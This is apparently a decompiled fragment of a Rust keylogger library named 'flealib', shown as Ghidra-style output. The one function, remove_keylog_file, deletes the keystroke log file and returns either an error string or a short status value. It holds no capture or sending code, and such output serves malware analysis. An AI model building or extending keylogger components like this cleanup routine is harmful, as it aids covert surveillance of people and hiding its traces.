undefined8
_ZN7flealib9keylogger18remove_keylog_file17hb8183b71da054a05E(undefined8 param_1,undefined8 param_2)

{
  long local_10;
  
  local_10 = _ZN3std2fs11remove_file17h9b9ca484ce24f094E(param_2);
  if (local_10 != 0) {
                    /* try { // try from 004a34da to 004a34e6 has its CatchHandler @ 004a3517 */
    _ZN49__LT_T_u20_as_u20_alloc__string__SpecToString_GT_14spec_to_string17h00281d94234d25d8E
              (param_1,&local_10);
    _ZN4core3ptr42drop_in_place_LT_std__io__error__Error_GT_17h96b79424257da29dE(&local_10);
    return param_1;
  }
  _ZN52__LT_T_u20_as_u20_alloc__slice__hack__ConvertVec_GT_6to_vec17h76be6af41d2a4859E
            (param_1,&DAT_0016ee2b,2);
  return param_1;
}